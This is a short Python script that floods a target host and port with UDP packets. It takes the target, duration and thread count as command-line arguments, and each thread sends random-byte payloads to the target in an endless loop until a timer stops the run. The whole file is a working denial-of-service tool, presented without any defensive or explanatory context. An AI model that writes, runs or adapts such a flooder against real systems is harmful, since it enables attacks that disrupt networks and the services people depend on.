import socket, sys, threading, random, os
import time as t

def timer():
	counter = time
	while True:
		counter -= 1
		if counter == 0:
			print("Finish")
			os._exit(1)
		t.sleep(1)

def send_flood():
	while True:
		conn.sendto(random._urandom(random.randint(88, 211)) * random.randint(5, 10), (host, port))

try:
	host = sys.argv[1]
	port = int(sys.argv[2])
	time = int(sys.argv[3])
	threads = int(sys.argv[4])
except:
	print("Missing Args | <host> <port> <time> <threads>")
	sys.exit()

conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

for i in range(0, threads):
	i += 1
	print(f"[{i}] Thread Started")
	threading.Thread(target = send_flood).start()
threading.Thread(target = timer).start()
